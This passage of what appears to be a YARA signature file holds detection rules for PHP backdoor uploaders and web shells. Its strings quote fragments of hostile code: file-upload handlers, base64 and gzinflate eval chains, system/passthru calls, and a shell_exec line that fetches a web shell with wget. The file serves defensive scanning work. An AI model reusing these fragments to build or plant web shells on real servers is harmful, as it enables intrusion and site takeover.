        $ps0 = "if($_REQUEST['action']=='unlink')"
    condition:
        $ps0
}

rule php_backdoor_uploader_278_03 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03012 and PR03009 and PR03011
}

rule php_backdoor_uploader_279 : backdoor
{
    strings:
        $trigger = "function class_x_i("
    condition:
        $trigger and PR00435
}

private rule PR03013 : trigger
{
    strings:
        $ps0 = "function class_x_i("
    condition:
        $ps0
}

rule php_backdoor_uploader_279_02 : backdoor
{
    strings:
        $trigger = "function BASE64_DEC0DE($"
    condition:
        $trigger and PR00435 and PR03013
}

rule php_backdoor_uploader_279_03 : backdoor
{
    strings:
        $trigger = "function https_check($custom_scheme"
    condition:
        $trigger and PR00435 and PR03013
}

private rule PR03014 : trigger
{
    strings:
        $ps0 = "function upfile()"
    condition:
        $ps0
}

rule php_backdoor_uploader_279_04 : backdoor
{
    strings:
        $trigger = "function BASE64_DEC0DE"
    condition:
        $trigger and PR03014 and PR01431
}

private rule PR03015 : trigger
{
    strings:
        $ps0 = "chmod($_SERVER[\"DOCUMENT_ROOT\"].'/'.$_GET['path'].'.php',0644);"
    condition:
        $ps0
}

rule php_backdoor_uploader_280 : backdoor
{
    strings:
        $trigger = "file_put_contents($path, '<?php /*'."
    condition:
        $trigger and PR03015 and PR01528
}

private rule PR03016 : trigger
{
    strings:
        $ps0 = "$record = file_get_contents_curl( $sourceurl );"
    condition:
        $ps0
}

private rule PR03017 : trigger
{
    strings:
        $ps0 = "echo $_GET['checkword'];"
    condition:
        $ps0
}

rule php_backdoor_uploader_281 : backdoor
{
    strings:
        $trigger = "fopen"
    condition:
        $trigger and PR00355 and PR03016 and PR03017
}

private rule PR03018 : trigger
{
    strings:
        $ps0 = "echo '<font color=\"red\">Chmod Gagal.."
    condition:
        $ps0
}

rule php_backdoor_uploader_282 : backdoor
{
    strings:
        $trigger = "function perms($file)"
    condition:
        $trigger and PR02458 and PR00507 and PR03018
}

private rule PR03019 : trigger
{
    strings:
        $ps0 = "explode('-'"
    condition:
        $ps0
}

rule php_backdoor_uploader_283 : backdoor
{
    strings:
        $trigger = "if(md5($_POST['password']) !="
    condition:
        $trigger and PR01332 and PR03019
}

private rule PR03020 : trigger
{
    strings:
        $ps0 = "</form><?php $uploaddir = getcwd ().\"/\";$uploadfile = $uploaddir"
    condition:
        $ps0
}

rule php_backdoor_uploader_284 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR01648 and PR01021 and PR03020
}

private rule PR03021 : trigger
{
    strings:
        $ps0 = "if(!isset($_POST['cmd']))"
    condition:
        $ps0
}

private rule PR03022 : trigger
{
    strings:
        $ps0 = "file_put_contents($f,'<?php '.$"
    condition:
        $ps0
}

private rule PR03023 : trigger
{
    strings:
        $ps0 = "include($f);"
    condition:
        $ps0
}

rule php_backdoor_uploader_285 : backdoor
{
    strings:
        $trigger = "unlink($f);"
    condition:
        $trigger and PR03021 and PR03022 and PR03023
}

private rule PR03024 : trigger
{
    strings:
        $ps0 = "if(isset($_POST['c'])){file_put_contents($_POST['n'],base64_decode($_POST['c']));}die();}"
    condition:
        $ps0
}

rule php_backdoor_uploader_286 : backdoor
{
    strings:
        $trigger = "if(isset($_GET['s'])){echo"
    condition:
        $trigger and PR03024
}

private rule PR03025 : trigger
{
    strings:
        $ps0 = "function getRequestUri()"
    condition:
        $ps0
}

private rule PR03026 : trigger
{
    strings:
        $ps0 = "function rwx($"
    condition:
        $ps0
}

rule php_backdoor_uploader_287 : backdoor
{
    strings:
        $trigger = "@chmod($dir"
    condition:
        $trigger and PR00435 and PR00341 and PR03025 and PR03026
}

private rule PR03027 : trigger
{
    strings:
        $ps0 = "eraseFileForGood("
    condition:
        $ps0
}

private rule PR03028 : trigger
{
    strings:
        $ps0 = "filemtime(\"$currentDir/$dir/\");"
    condition:
        $ps0
}

rule php_backdoor_uploader_288 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03027 and PR00355 and PR00357 and PR03028
}

private rule PR03029 : trigger
{
    strings:
        $ps0 = "if(isset($_REQUEST[base64_decode(chr("
    condition:
        $ps0
}

rule php_backdoor_uploader_289 : backdoor
{
    strings:
        $trigger = "CURLOPT_COOKIEJAR,$GLOBALS[base64_decode(chr("
    condition:
        $trigger and PR03029 and PR02836 and PR01398
}

private rule PR03030 : trigger
{
    strings:
        $ps0 = "function gethttpcnt($url,$username"
    condition:
        $ps0
}

private rule PR03031 : trigger
{
    strings:
        $ps0 = "function createFolder($path)"
    condition:
        $ps0
}

rule php_backdoor_uploader_290 : backdoor
{
    strings:
        $trigger = "$_SERVER['DOCUMENT_ROOT']"
    condition:
        $trigger and PR01362 and PR03030 and PR03031
}

private rule PR03032 : trigger
{
    strings:
        $ps0 = "file_put_contents($output[0]"
    condition:
        $ps0
}

rule php_backdoor_uploader_291 : backdoor
{
    strings:
        $trigger = "function scan_dir($dir)"
    condition:
        $trigger and PR03032
}

private rule PR03033 : trigger
{
    strings:
        $ps0 = "<a href='$pile' target='_blank'>"
    condition:
        $ps0
}

rule php_backdoor_uploader_292 : backdoor
{
    strings:
        $trigger = "You don't have permission to access \".$_SERVER"
    condition:
        $trigger and PR03033 and PR01490
}

rule php_backdoor_uploader_294 : backdoor
{
    strings:
        $trigger = "file_put_contents ($pst_vars['n'],$pst_vars['cmt']);"
    condition:
        $trigger
}

private rule PR03034 : trigger
{
    strings:
        $ps0 = "function system_start()"
    condition:
        $ps0
}

private rule PR03035 : trigger
{
    strings:
        $ps0 = "\"openvd\")"
    condition:
        $ps0
}

rule php_backdoor_uploader_295 : backdoor
{
    strings:
        $trigger = "_COOKIE"
    condition:
        $trigger and PR03034 and PR03035
}

rule php_backdoor_uploader_296 : backdoor
{
    strings:
        $trigger = "if($_GET['s4t4n']==\"true\")"
    condition:
        $trigger and PR01332
}

private rule PR03036 : trigger
{
    strings:
        $ps0 = "$file=explode(':',base64_decode($_POST['return']));"
    condition:
        $ps0
}

rule php_backdoor_uploader_298 : backdoor
{
    strings:
        $trigger = "header('Content-Type:"
    condition:
        $trigger and PR01021 and PR03036 and PR01431
}

// MANUAL FIX NECESSARY
rule php_backdoor_uploader_299 : backdoor
{
    strings:
        $trigger = "file_put_contents"
        $php_backdoor_uploader_299_r0 = /[\w]+\(\);[\s]*function[\s]*[\w]+\(\)[\s]*\{[\s]*if\(isset\(\$_REQUEST\[.[\w]*.\]\)\)[^\(]+file_put_contents\(\$[\w]*,stripslashes[\s]*\(\$[\w]*\)\);[^\}]+echo[\s]*\$[\w]*;[\s]*exit;[\s]*\}[\s]*\}/
    condition:
        $trigger and $php_backdoor_uploader_299_r0
}

// MANUAL FIX NECESSARY
rule php_backdoor_uploader_300 : backdoor
{
    strings:
        $trigger = "file_put_contents"
        $php_backdoor_uploader_300_r0 = /\$[\w]*[\s]*=[\s]*file_get_contents\(.[\w]*.\);\$[\w]*[\s]*=[\s]*base64_decode\(\$[\w]*\);[\s]*file_put_contents\(.[\w]*.,\$[\w]*\);include\(.[\w]*.\);unlink\(.[\w]*.\);/
    condition:
        $trigger and $php_backdoor_uploader_300_r0
}

// MANUAL FIX NECESSARY
private rule PR03037 : trigger
{
    strings:
        $ps0 = "MAKLO UPLOADER"
    condition:
        $ps0
}

rule php_backdoor_uploader_301 : backdoor
{
    strings:
        $trigger = "$_POST"
        $php_backdoor_uploader_301_r0 = /\}[\s]*\?>/
    condition:
        $trigger and PR03037 and PR00397 and $php_backdoor_uploader_301_r0
}

private rule PR03038 : trigger
{
    strings:
        $ps0 = "echo \"Return Code: \" . $_FILES[\"file\"][\"error\"] . \"<br>\";"
    condition:
        $ps0
}

rule php_backdoor_uploader_302 : backdoor
{
    strings:
        $trigger = " * @package  "
    condition:
        $trigger and PR03038 and PR00925
}

private rule PR03039 : trigger
{
    strings:
        $ps0 = "gzinflate(base64_decode($"
    condition:
        $ps0
}

rule php_backdoor_uploader_303 : backdoor
{
    strings:
        $trigger = "==(string)$val)"
    condition:
        $trigger and PR03039 and PR00029
}

private rule PR03040 : trigger
{
    strings:
        $ps0 = "echo ($subdir)? url().\"/\".$subdir.\"/editor/save.php\""
    condition:
        $ps0
}

rule php_backdoor_uploader_304 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03040 and PR01428
}

private rule PR03041 : trigger
{
    strings:
        $ps0 = "if($_POST[\"v\"]==uploadwoi){if(@copy($_FILES"
    condition:
        $ps0
}

rule php_backdoor_uploader_305 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR03041
}

private rule PR03042 : trigger
{
    strings:
        $ps0 = "needtoloadsomefiles"
    condition:
        $ps0
}

private rule PR03043 : trigger
{
    strings:
        $ps0 = "&checkdomain&host="
    condition:
        $ps0
}

rule php_backdoor_uploader_306 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03042 and PR03043 and PR00357
}

rule php_backdoor_uploader_307 : backdoor
{
    strings:
        $trigger = "XOeZobPmMZk9qPkvKxHwPA+uz5LbSMHlsoRPvOIL/ZsLl/hxInbGQTfnB0uB7A8="
    condition:
        $trigger and PR01398
}

private rule PR03044 : trigger
{
    strings:
        $ps0 = "jVRtb9s4DP4eIP+BEYqzAzR2OuzDYU3Sa4ukHbZlRZIe7lAMhiIzthDZ"
    condition:
        $ps0
}

rule php_backdoor_uploader_309 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR03044
}

private rule PR03045 : trigger
{
    strings:
        $ps0 = "elseif (function_exists('passthru'))"
    condition:
        $ps0
}

rule php_backdoor_uploader_310 : backdoor
{
    strings:
        $trigger = "@system($window);"
    condition:
        $trigger and PR03045
}

private rule PR03046 : trigger
{
    strings:
        $ps0 = "= \"/footer.php\";}"
    condition:
        $ps0
}

private rule PR03047 : trigger
{
    strings:
        $ps0 = "preg_replace('/<!--'.$"
    condition:
        $ps0
}

private rule PR03048 : trigger
{
    strings:
        $ps0 = ".'/wp-login.php';"
    condition:
        $ps0
}

rule php_backdoor_uploader_311 : backdoor
{
    strings:
        $trigger = "fopen(\"$htaccess\", \"w\");"
    condition:
        $trigger and PR03046 and PR00355 and PR03047 and PR01392 and PR03048 and PR01431
}

rule php_backdoor_uploader_312 : backdoor
{
    strings:
        $trigger = "setcookie('current_id',phpversion());"
    condition:
        $trigger and PR00435
}

rule php_backdoor_uploader_313 : backdoor
{
    strings:
        $trigger = ">SUCCESS UPLOAD : </font><a href='$web$file' target"
    condition:
        $trigger and PR01746 and PR01490
}

private rule PR03049 : trigger
{
    strings:
        $ps0 = "fopen($NONCE_PATH, \"w\");"
    condition:
        $ps0
}

rule php_backdoor_uploader_314 : backdoor
{
    strings:
        $trigger = "assthru"
    condition:
        $trigger and PR03049
}

private rule PR03050 : trigger
{
    strings:
        $ps0 = "ZXZhbCUyOCUyNnF1b3QlM0IlM0YlMjZndCUzQiUyNnF1b3QlM0IuZ3p1bmN"
    condition:
        $ps0
}

rule php_backdoor_uploader_315 : backdoor
{
    strings:
        $trigger = "urldecode("
    condition:
        $trigger and PR00029 and PR03050
}

private rule PR03051 : trigger
{
    strings:
        $ps0 = "get_cron_array("
    condition:
        $ps0
}

private rule PR03052 : trigger
{
    strings:
        $ps0 = "$info = array_merge($_REQUEST,"
    condition:
        $ps0
}

rule php_backdoor_uploader_316 : backdoor
{
    strings:
        $trigger = "($_POST)"
    condition:
        $trigger and PR03051 and PR03052
}

rule php_backdoor_uploader_317 : backdoor
{
    strings:
        $trigger = "sLafY7ZtkhIFAWZIdw9IpOlHu7/Yf2RrPdDLf8dh2XBkP8"
    condition:
        $trigger and PR02205
}

private rule PR03053 : trigger
{
    strings:
        $ps0 = "]); die(md5(1));"
    condition:
        $ps0
}

rule php_backdoor_uploader_318 : backdoor
{
    strings:
        $trigger = "echo @file_put_contents($_POST["
    condition:
        $trigger and PR03053
}

private rule PR03054 : trigger
{
    strings:
        $ps0 = "LF3HsqXAjvyaiWxY/IEl3nvPcwLvvefrB2G/6IiO7ng4QyWlMiWVS"
    condition:
        $ps0
}

rule php_backdoor_uploader_319 : backdoor
{
    strings:
        $trigger = "eval(str_rot13(gzinflate(str_rot13(base64_decode("
    condition:
        $trigger and PR03054
}

rule php_backdoor_uploader_320 : backdoor
{
    strings:
        $trigger = "shell_exec('wget https://phpshell"
    condition:
        $trigger
}

rule php_backdoor_uploader_321 : backdoor
{
    strings:
        $trigger = "===base64_decode('cGluZw=='))exit(base64_decode('b2s='));"
    condition:
        $trigger and PR01877
}

private rule PR03055 : trigger
{
    strings:
        $ps0 = "$fgood = fopen($path.$filename, 'w');"
    condition:
        $ps0
}

rule php_backdoor_uploader_322 : backdoor
{
    strings:
        $trigger = "$fgood = fopen(__FILE__, 'w');"
    condition:
        $trigger and PR03055
}

rule php_backdoor_uploader_323 : backdoor
{
    strings:
        $trigger = "if (file_put_contents(sprintf('%s/wp-loader.php', $file->getPath()), $loader)) {"
    condition:
        $trigger
}

private rule PR03056 : trigger
{
    strings:
        $ps0 = "x65\\x76\\x61\\x6c\\x28\\x62\\x61\\x73\\x65\\x36\\x34\\x5f\\x64\\x65\\x63"
    condition:
        $ps0
}

rule php_backdoor_uploader_324 : backdoor
{
    strings:
        $trigger = "error_reporting"
    condition:
        $trigger and PR03056 and PR01353
}

private rule PR03057 : trigger
{
    strings:
        $ps0 = "$getCache = base64_decode(\"aHR0c"
    condition:
        $ps0
}

private rule PR03058 : trigger
{
    strings:
        $ps0 = "$getindex = file_get_contents($getCache);"
    condition:
        $ps0
}

rule php_backdoor_uploader_325 : backdoor
{
    strings:
        $trigger = "fopen"
    condition:
        $trigger and PR03057 and PR03058 and PR00355 and PR01392
}

rule php_backdoor_uploader_326 : backdoor
{
    strings:
        $trigger = "Ly8gU2ltcGxlIFBIUCBVcGxvYWQgU2NyaXB0O"
    condition:
        $trigger and PR01398
}

private rule PR03059 : trigger
{
    strings:
        $ps0 = "if (!empty($_FILES) && is_uploaded_file"
    condition:
        $ps0
}

rule php_backdoor_uploader_327 : backdoor
{
    strings:
        $trigger = "($_FILES[$fname][$tname], $_FILES[$fname][$name]);"
    condition:
        $trigger and PR01428 and PR01431 and PR01021 and PR03059
}

private rule PR03060 : trigger
{
    strings:
        $ps0 = "X-Forwarded-For"
    condition:
        $ps0
}

private rule PR03061 : trigger
{
    strings:
        $ps0 = "file_get_contents('http"
    condition:
        $ps0
}

rule php_backdoor_uploader_328 : backdoor
{
    strings:
        $trigger = "header('Content-Type:"
    condition:
        $trigger and PR03060 and PR01021 and PR03061
}

private rule PR03062 : trigger
{
    strings:
        $ps0 = "$url = \"http://\" . $_SERVER['HTTP_HOST']"
    condition:
        $ps0
}

private rule PR03063 : trigger
{
    strings:
        $ps0 = "file_put_contents($Name, $"
    condition:
        $ps0
}

rule php_backdoor_uploader_329 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03062 and PR03063 and PR01021
}

rule php_backdoor_uploader_330 : backdoor
{
    strings:
        $trigger = "vVVdb9owFH1epPyHizcpoDUJMKqtkKTTtJZVWrVJdE8IVY5jEo8"
    condition:
        $trigger and PR00029 and PR01436
}

// MANUAL FIX NECESSARY
rule php_backdoor_uploader_331 : backdoor
{
    strings:
        $trigger = "echo"
        $php_backdoor_uploader_331_r0 = /if[\s]*\(move_uploaded_file[\s]*\(\$_FILES\[\"userfile\"\]\[\"tmp_name\"\][\s]*,[\s]*\$uploadfile\)[\s]*\)[\s]*\{[\s]*echo/
    condition:
        $trigger and PR02458 and PR00507 and $php_backdoor_uploader_331_r0
}

private rule PR03064 : trigger
{
    strings:
        $ps0 = "<?=$_SERVER['SERVER_NAME']?>(<?=@gethostbyname($_SERVER['SERVER_NAME'])?>)"
    condition:
        $ps0
}

rule php_backdoor_uploader_332 : backdoor
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR01444 and PR03064
}

private rule PR03065 : trigger
{
    strings:
        $ps0 = "Q3JlYXRlX0Z1bmN0aW9u\");$style=$css('',preg_replace(\"/#html/\",\"\",$html));$style();"
    condition:
        $ps0
}

rule php_backdoor_uploader_333 : backdoor
{
    strings:
        $trigger = "pass"
    condition:
        $trigger and PR03065 and PR01479
}

rule php_backdoor_uploader_334 : backdoor
{
    strings:
        $trigger = "if(httpcopy($_GET['url'], $_GET['filename'])){"
    condition:
        $trigger and PR00435 and PR00341
}

// MANUAL FIX NECESSARY
rule php_backdoor_uploader_335 : backdoor
{
    strings:
        $trigger = "curl_init("
        $php_backdoor_uploader_335_r0 = /chmod\(\$_SERVER\[.DOCUMENT_ROOT[^\{]+function[\s]*[\w]+\(\$[\w]+\)[\s]*\{[^\}]+\}[\s]*\$[\w]+[\s]*=[\s]*\$_SERVER[^\(]+\(.http/
    condition:
        $trigger and PR00435 and PR02099 and $php_backdoor_uploader_335_r0
}

private rule PR03066 : trigger
{
    strings:
        $ps0 = "(move_uploaded_file($files['tmp_name'], $fullpath))"
    condition:
        $ps0
}

private rule PR03067 : trigger
{
    strings:
        $ps0 = "['website']"
    condition:
        $ps0
}

rule php_backdoor_uploader_336 : backdoor
{
    strings:
        $trigger = "exit;"
    condition:
        $trigger and PR00039 and PR02056 and PR03066 and PR03067
}

private rule PR03068 : trigger
{
    strings:
        $ps0 = "if($_POST['_login'] == \"LOGIN\" and md5($_POST[\"user\"])"
    condition:
        $ps0
}

private rule PR03069 : trigger
{
    strings:
        $ps0 = "echo '<input type=\"text\" name=\"user\" size=\"50\"><input type=\"submit\" name=\"_login\" id=\"_login\" value=\"LOGIN\"></form>';"
    condition:
        $ps0
}

rule php_backdoor_uploader_337 : backdoor
{
    strings:
        $trigger = "@ini_set('output_buffering', 0);"
    condition:
        $trigger and PR03068 and PR03069
}

rule php_backdoor_uploader_338 : backdoor
{
    strings:
        $trigger = "if (!is_uploaded_file($_FILES[\"upfile\"][tmp_name])"
    condition:
        $trigger and PR02779 and PR00203
}

private rule PR03070 : trigger
{
    strings:
        $ps0 = "<address>Apache Server"
    condition:
        $ps0
}

private rule PR03071 : trigger
{
    strings:
        $ps0 = "Not Found"
    condition:
        $ps0
}

private rule PR03072 : trigger
{
    strings:
        $ps0 = "move_uploaded_file($_FILES["
    condition:
        $ps0
}

rule php_backdoor_uploader_339 : backdoor
{
    strings:
        $trigger = "isset"
    condition:
        $trigger and PR01382 and PR03070 and PR03071 and PR02769 and PR03072
}

private rule PR03073 : trigger
{
    strings:
        $ps0 = "\"]});if(${${\""
    condition:
        $ps0
}

private rule PR03074 : trigger
{
    strings:
        $ps0 = ">\";move_uploaded_file(${${"
    condition:
        $ps0
}

private rule PR03075 : trigger
{
    strings:
        $ps0 = ">\\n\";@ob_start();error_reporting(E_ERROR|E_WARNING|E_PARSE|E_NOTICE);@ini_set("
    condition:
        $ps0
}

rule php_backdoor_uploader_340 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR03073 and PR01021 and PR03074 and PR03075
}

private rule PR03076 : trigger
{
    strings:
        $ps0 = "[\"SERVER_PORT\"]){return true;}if($GLOBALS["
    condition:
        $ps0
}

private rule PR03077 : trigger
{
    strings:
        $ps0 = "(){@eval($"
    condition:
        $ps0
}

rule php_backdoor_uploader_341 : backdoor
{
    strings:
        $trigger = "](__FILE__)){die($GLOBALS["
    condition:
        $trigger and PR01968 and PR01623 and PR03076 and PR03077
}

private rule PR03078 : trigger
{
    strings:
        $ps0 = "XZFRa8IwFIWfFfwPEQq3BWndujFYdTC3WvcyZtwGW5HQlDSOam2jjabif1"
    condition:
        $ps0
}

rule php_backdoor_uploader_342 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR03078
}

private rule PR03079 : trigger
{
    strings:
        $ps0 = "if($_SESSION["
    condition:
        $ps0
}

rule php_backdoor_uploader_343 : backdoor
{
    strings:
        $trigger = "md5(sha1($"
    condition:
        $trigger and PR02787 and PR02388 and PR03079
}

private rule PR03080 : trigger
{
    strings:
        $ps0 = "curl_init('http"
    condition:
        $ps0
}

rule php_backdoor_uploader_344 : backdoor
{
    strings:
        $trigger = "trim($_REQUEST["
    condition:
        $trigger and PR00435 and PR02104 and PR03080
}

private rule PR03081 : trigger
{
    strings:
        $ps0 = "= chr(60).chr(63).chr(112).chr(104).chr(112).chr(32);"
    condition:
        $ps0
}

rule php_backdoor_uploader_345 : backdoor
{
    strings:
        $trigger = "($_REQUEST[chr("
    condition:
        $trigger and PR00732 and PR03081
}

rule php_backdoor_uploader_346 : backdoor
{
    strings:
        $trigger = "PD9waHAgCi8vV2lsbCBjb"
    condition:
        $trigger and PR01403 and PR01415 and PR01479
}

rule php_backdoor_uploader_347 : backdoor
{
    strings:
        $trigger = "<a href=$userfile_name><center><b>Sucess"
    condition:
        $trigger and PR01332
}

private rule PR03082 : trigger
{
    strings:
        $ps0 = "echo $link.$file2.'?bajatax='.$password;"
    condition:
        $ps0
}

rule php_backdoor_uploader_347_02 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR03082 and PR00357
}

private rule PR03083 : trigger
{
    strings:
        $ps0 = "if($_GET[\"login\"]=="
    condition:
        $ps0
}

rule php_backdoor_uploader_348 : backdoor
{
    strings:
        $trigger = "){if(@copy($_FILES["
    condition:
        $trigger and PR03083 and PR02880
}

rule php_backdoor_uploader_350 : backdoor
{
    strings:
        $trigger = "YzInXSA9IGJhc2U2NF9lbmNvZGUoYmFzZTY0X2VuY29kZSgoc2VyaWFsaXplKCRfU0VSVkVSKSkp"
    condition:
        $trigger and PR01398
}

private rule PR03084 : trigger
{
    strings:
        $ps0 = "if(stristr(__DIR__,\"plugins\")){"
    condition:
        $ps0
}

private rule PR03085 : trigger
{
    strings:
        $ps0 = "preg_match_all("
    condition:
        $ps0
}

rule php_backdoor_uploader_351 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR03084 and PR01362 and PR03085
}

rule php_backdoor_uploader_352 : backdoor
{
    strings:
        $trigger = "CiRVZVhwbG9p"
    condition:
        $trigger and PR01398
}

rule php_backdoor_uploader_352_02 : backdoor
{
    strings:
        $trigger = "Z2V0X3RlbXBfZGlyKCkuYmFzZTY0X2RlY29kZS"
    condition:
        $trigger and PR01398
}

private rule PR03086 : trigger
{
    strings:
        $ps0 = "Ii9zdHMuemlwIik7Cn0KCj8+Cjw/cGhwCgokdXNlciA9IGdldF9jdXJyZW50X3VzZXIoKTsKJHNp"
    condition:
        $ps0
}

rule php_backdoor_uploader_352_03 : backdoor
{
    strings:
        $trigger = "eval(base64_decode"
    condition:
        $trigger and PR03086
}

rule php_backdoor_uploader_352_04 : backdoor
{
    strings:
        $trigger = "$dizge ="
    condition:
        $trigger and PR01398
}

private rule PR03087 : trigger
{
    strings:
        $ps0 = "$_GET[\"rdir\"];"
    condition:
        $ps0
}

private rule PR03088 : trigger
{
    strings:
        $ps0 = "@chmod($value,0744);"
    condition:
        $ps0
}

rule php_backdoor_uploader_353 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03087 and PR00355 and PR03088 and PR00357
}

private rule PR03089 : trigger
{
    strings:
        $ps0 = "\"])) die;"
    condition:
        $ps0
}

private rule PR03090 : trigger
{
    strings:
        $ps0 = "$url = 'http"
    condition:
        $ps0
}

private rule PR03091 : trigger
{
    strings:
        $ps0 = "curl_setopt($ch,CURLOPT_POSTFIELDS,http_build_query($_POST));"
    condition:
        $ps0
}

rule php_backdoor_uploader_354 : backdoor
{
    strings:
        $trigger = "isset($_POST["
    condition:
        $trigger and PR03089 and PR03090 and PR03091
}

// MANUAL FIX NECESSARY
rule php_backdoor_uploader_355 : backdoor
{
    strings:
        $trigger = "$_FILES["
        $php_backdoor_uploader_355_r0 = /<\?php[\s]*move_uploaded_file\(\$_FILES\[.[\w]+.\][\s]*\[.[\w]+.],[\s]*(.[\w]+\.[\w]+.|\$_POST\[.[\w]+.\])\);/
    condition:
        $trigger and PR01648 and $php_backdoor_uploader_355_r0
}

rule php_backdoor_uploader_356 : backdoor
{
    strings:
        $trigger = "fopen($url.$_GET["
    condition:
        $trigger and PR01332
}

private rule PR03092 : trigger
{
    strings:
        $ps0 = "\"])){move_uploaded_file($_FILES[\""
    condition:
        $ps0
}

private rule PR03093 : trigger
{
    strings:
        $ps0 = "\"])){@ini_set(\""
    condition:
        $ps0
}

private rule PR03094 : trigger
{
    strings:
        $ps0 = "\");if(isset($_REQUEST[\""
    condition:
        $ps0
}

rule php_backdoor_uploader_357 : backdoor
{
    strings:
        $trigger = "\".php_uname().\""
    condition:
        $trigger and PR03092 and PR03093 and PR03094
}

rule php_backdoor_uploader_358 : backdoor
{
    strings:
        $trigger = "$target_url = \"http://$target_host"
    condition:
        $trigger and PR00435 and PR00341
}

private rule PR03095 : trigger
{
    strings:
        $ps0 = "ZXN1bHQgPSBjdXJsX2V4ZWMoJG"
    condition:
        $ps0
}

rule php_backdoor_uploader_359 : backdoor
{
    strings:
        $trigger = "('','',$"
    condition:
        $trigger and PR01179 and PR03095
}

private rule PR03096 : trigger
{
    strings:
        $ps0 = "]];}else{echo$GLOBALS{O0}[0x"
    condition:
        $ps0
}

private rule PR03097 : trigger
{
    strings:
        $ps0 = "error_reporting(E_ALL^E_NOTICE);define('O0', 'O');"
    condition:
        $ps0
}

rule php_backdoor_uploader_360 : backdoor
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR03096 and PR03097 and PR00397
}

// MANUAL FIX NECESSARY
rule php_backdoor_uploader_361 : backdoor
{
    strings:
        $trigger = "file_get_contents"
        $php_backdoor_uploader_361_r0 = /<\?php[\s]*\$[\w]+[\s]*=[\s]*file_get_contents\([^;]+\);[\s]*fwrite\(fopen\([^\)]+\),[^\;]+\.[\s]*\$[\w]+\);/
    condition:
        $trigger and PR00355 and PR00357 and $php_backdoor_uploader_361_r0
}

rule php_backdoor_uploader_362 : backdoor
{
    strings:
        $trigger = "IME8p53lyNK0aJ7QwChRwN7VGE9NxLcOZWmPH6o7tvm"
    condition:
        $trigger and PR01398
}

rule php_backdoor_uploader_363 : backdoor
{
    strings:
        $trigger = "if(isset($_FILES['uf']['name'])){$uf=@basename($_FILES['uf']['name']);"
    condition:
        $trigger and PR01332
}

private rule PR03098 : trigger
{
    strings:
        $ps0 = "if(@move_uploaded_file($_FILES['uf"
    condition:
        $ps0
}

rule php_backdoor_uploader_363_02 : backdoor
{
    strings:
        $trigger = "if(isset($_FILES['uf']['name'])){$uf=@basename($_FILES['uf']['name']);"
    condition:
        $trigger and PR03098
}

rule php_backdoor_uploader_364 : backdoor
{
    strings:
        $trigger = "$setting = plugins($_GET[\"query\"],$dimi);"
    condition:
        $trigger and PR00092
}

// MANUAL FIX NECESSARY
private rule PR03099 : trigger
{
    strings:
        $ps0 = "(copy($_FILES["
    condition:
        $ps0
}

private rule PR03100 : trigger
{
    strings:
        $ps0 = "$uploaddir.basename($_FILES['uploadfile']['name']);"
    condition:
        $ps0
}

rule php_backdoor_uploader_365 : backdoor
{
    strings:
        $trigger = "REQUE"
        $php_backdoor_uploader_365_r0 = /enctype=.?multipart\/form-data/
    condition:
        $trigger and PR03099 and PR03100 and PR01021 and PR00397 and $php_backdoor_uploader_365_r0
}

private rule PR03101 : trigger
{
    strings:
        $ps0 = ".php_uname()."
    condition:
        $ps0
}

private rule PR03102 : trigger
{
    strings:
        $ps0 = "]==up){if(@copy($_FILES["
    condition:
        $ps0
}

rule php_backdoor_uploader_366 : backdoor
{
    strings:
        $trigger = "multipart/form-data"
    condition:
        $trigger and PR01382 and PR03101 and PR03102 and PR00397
}

rule php_backdoor_uploader_367 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02007 and PR02458 and PR00507 and PR02769
}

private rule PR03103 : trigger
{
    strings:
        $ps0 = "echo '<a href=\"?up&path=';"
    condition:
        $ps0
}

rule php_backdoor_uploader_368 : backdoor
{
    strings:
        $trigger = "POST"
    condition:
        $trigger and PR03103 and PR02458
}

private rule PR03104 : trigger
{
    strings:
        $ps0 = "echo $name;"
    condition:
        $ps0
}

rule php_backdoor_uploader_369 : backdoor
{
    strings:
        $trigger = "echo \"file not found\";"
    condition:
        $trigger and PR01332 and PR03104
}

private rule PR03105 : trigger
{
    strings:
        $ps0 = "ploader</title></head><body><center><form action="
    condition:
        $ps0
}

rule php_backdoor_uploader_370 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR00507 and PR03105
}

private rule PR03106 : trigger
{
    strings:
        $ps0 = "test'){echo 'ok';exit;}"
    condition:
        $ps0
}

rule php_backdoor_uploader_371 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03106
}

private rule PR03107 : trigger
{
    strings:
        $ps0 = "]}[0])?true:false):header('Content-Type: image/jpeg');break;case(preg_match(\"/\\.pdf/i\",${${\""
    condition:
        $ps0
}

rule php_backdoor_uploader_372 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03107 and PR00355 and PR01392 and PR00357
}

rule php_backdoor_uploader_373 : backdoor
{
    strings:
        $trigger = "exit;}else{echo \"write_failed\";}}unlink("
    condition:
        $trigger and PR00732
}

rule php_backdoor_uploader_374 : backdoor
{
    strings:
        $trigger = "{@file_get_contents(hex2bin($pvar).$_GET['p'].'&h='.$_GET['h']);exit;}"
    condition:
        $trigger
}

rule php_backdoor_uploader_374_02 : backdoor
{
    strings:
        $trigger = "@file_put_contents($tmp,file_get_contents(hex2bin"
    condition:
        $trigger
}

rule php_backdoor_uploader_375 : backdoor
{
    strings:
